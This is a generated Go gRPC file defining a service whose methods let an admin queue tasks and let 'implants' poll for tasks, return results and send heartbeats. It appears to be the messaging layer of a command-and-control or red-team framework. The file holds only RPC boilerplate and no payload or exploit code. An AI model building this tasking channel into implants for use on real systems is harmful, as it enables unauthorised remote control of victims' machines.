// Code generated by protoc-gen-go-grpc. DO NOT EDIT.

package proto

import (
	context "context"
	grpc "google.golang.org/grpc"
	codes "google.golang.org/grpc/codes"
	status "google.golang.org/grpc/status"
)

// This is a compile-time assertion to ensure that this generated file
// is compatible with the grpc package it is being compiled against.
// Requires gRPC-Go v1.32.0 or later.
const _ = grpc.SupportPackageIsVersion7

// ServerClient is the client API for Server service.
//
// For semantics around ctx use and closing/ending streaming RPCs, please refer to https://pkg.go.dev/google.golang.org/grpc/?tab=doc#ClientConn.NewStream.
type ServerClient interface {
	AdminNewTask(ctx context.Context, in *Task, opts ...grpc.CallOption) (*NewTaskResult, error)
	AdminGetTask(ctx context.Context, in *TaskId, opts ...grpc.CallOption) (*Task, error)
	// Implant cmds: retorna resultados de trabajos anterioes y recibe nuevos
	ImplantGetTask(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Task, error)
	ImplantResultTask(ctx context.Context, in *Task, opts ...grpc.CallOption) (*Empty, error)
	ImplantAlive(ctx context.Context, in *AliveMsg, opts ...grpc.CallOption) (*Empty, error)
}

type serverClient struct {
	cc grpc.ClientConnInterface
}

func NewServerClient(cc grpc.ClientConnInterface) ServerClient {
	return &serverClient{cc}
}

func (c *serverClient) AdminNewTask(ctx context.Context, in *Task, opts ...grpc.CallOption) (*NewTaskResult, error) {
	out := new(NewTaskResult)
	err := c.cc.Invoke(ctx, "/Server/AdminNewTask", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *serverClient) AdminGetTask(ctx context.Context, in *TaskId, opts ...grpc.CallOption) (*Task, error) {
	out := new(Task)
	err := c.cc.Invoke(ctx, "/Server/AdminGetTask", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *serverClient) ImplantGetTask(ctx context.Context, in *Empty, opts ...grpc.CallOption) (*Task, error) {
	out := new(Task)
	err := c.cc.Invoke(ctx, "/Server/ImplantGetTask", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *serverClient) ImplantResultTask(ctx context.Context, in *Task, opts ...grpc.CallOption) (*Empty, error) {
	out := new(Empty)
	err := c.cc.Invoke(ctx, "/Server/ImplantResultTask", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

func (c *serverClient) ImplantAlive(ctx context.Context, in *AliveMsg, opts ...grpc.CallOption) (*Empty, error) {
	out := new(Empty)
	err := c.cc.Invoke(ctx, "/Server/ImplantAlive", in, out, opts...)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// ServerServer is the server API for Server service.
// All implementations must embed UnimplementedServerServer
// for forward compatibility
type ServerServer interface {
	AdminNewTask(context.Context, *Task) (*NewTaskResult, error)
	AdminGetTask(context.Context, *TaskId) (*Task, error)
	// Implant cmds: retorna resultados de trabajos anterioes y recibe nuevos
	ImplantGetTask(context.Context, *Empty) (*Task, error)
	ImplantResultTask(context.Context, *Task) (*Empty, error)
	ImplantAlive(context.Context, *AliveMsg) (*Empty, error)
	mustEmbedUnimplementedServerServer()
}

// UnimplementedServerServer must be embedded to have forward compatible implementations.
type UnimplementedServerServer struct {
}

func (UnimplementedServerServer) AdminNewTask(context.Context, *Task) (*NewTaskResult, error) {
	return nil, status.Errorf(codes.Unimplemented, "method AdminNewTask not implemented")
}
func (UnimplementedServerServer) AdminGetTask(context.Context, *TaskId) (*Task, error) {
	return nil, status.Errorf(codes.Unimplemented, "method AdminGetTask not implemented")
}
func (UnimplementedServerServer) ImplantGetTask(context.Context, *Empty) (*Task, error) {
	return nil, status.Errorf(codes.Unimplemented, "method ImplantGetTask not implemented")
}
func (UnimplementedServerServer) ImplantResultTask(context.Context, *Task) (*Empty, error) {
	return nil, status.Errorf(codes.Unimplemented, "method ImplantResultTask not implemented")
}
func (UnimplementedServerServer) ImplantAlive(context.Context, *AliveMsg) (*Empty, error) {
	return nil, status.Errorf(codes.Unimplemented, "method ImplantAlive not implemented")
}
func (UnimplementedServerServer) mustEmbedUnimplementedServerServer() {}

// UnsafeServerServer may be embedded to opt out of forward compatibility for this service.
// Use of this interface is not recommended, as added methods to ServerServer will
// result in compilation errors.
type UnsafeServerServer interface {
	mustEmbedUnimplementedServerServer()
}

func RegisterServerServer(s grpc.ServiceRegistrar, srv ServerServer) {
	s.RegisterService(&Server_ServiceDesc, srv)
}

func _Server_AdminNewTask_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(Task)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ServerServer).AdminNewTask(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/Server/AdminNewTask",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ServerServer).AdminNewTask(ctx, req.(*Task))
	}
	return interceptor(ctx, in, info, handler)
}

func _Server_AdminGetTask_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(TaskId)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ServerServer).AdminGetTask(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/Server/AdminGetTask",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ServerServer).AdminGetTask(ctx, req.(*TaskId))
	}
	return interceptor(ctx, in, info, handler)
}

func _Server_ImplantGetTask_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(Empty)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ServerServer).ImplantGetTask(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/Server/ImplantGetTask",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ServerServer).ImplantGetTask(ctx, req.(*Empty))
	}
	return interceptor(ctx, in, info, handler)
}

func _Server_ImplantResultTask_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(Task)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ServerServer).ImplantResultTask(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/Server/ImplantResultTask",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ServerServer).ImplantResultTask(ctx, req.(*Task))
	}
	return interceptor(ctx, in, info, handler)
}

func _Server_ImplantAlive_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
	in := new(AliveMsg)
	if err := dec(in); err != nil {
		return nil, err
	}
	if interceptor == nil {
		return srv.(ServerServer).ImplantAlive(ctx, in)
	}
	info := &grpc.UnaryServerInfo{
		Server:     srv,
		FullMethod: "/Server/ImplantAlive",
	}
	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
		return srv.(ServerServer).ImplantAlive(ctx, req.(*AliveMsg))
	}
	return interceptor(ctx, in, info, handler)
}

// Server_ServiceDesc is the grpc.ServiceDesc for Server service.
// It's only intended for direct use with grpc.RegisterService,
// and not to be introspected or modified (even as a copy)
var Server_ServiceDesc = grpc.ServiceDesc{
	ServiceName: "Server",
	HandlerType: (*ServerServer)(nil),
	Methods: []grpc.MethodDesc{
		{
			MethodName: "AdminNewTask",
			Handler:    _Server_AdminNewTask_Handler,
		},
		{
			MethodName: "AdminGetTask",
			Handler:    _Server_AdminGetTask_Handler,
		},
		{
			MethodName: "ImplantGetTask",
			Handler:    _Server_ImplantGetTask_Handler,
		},
		{
			MethodName: "ImplantResultTask",
			Handler:    _Server_ImplantResultTask_Handler,
		},
		{
			MethodName: "ImplantAlive",
			Handler:    _Server_ImplantAlive_Handler,
		},
	},
	Streams:  []grpc.StreamDesc{},
	Metadata: "src/internal/proto/grpc.proto",
}
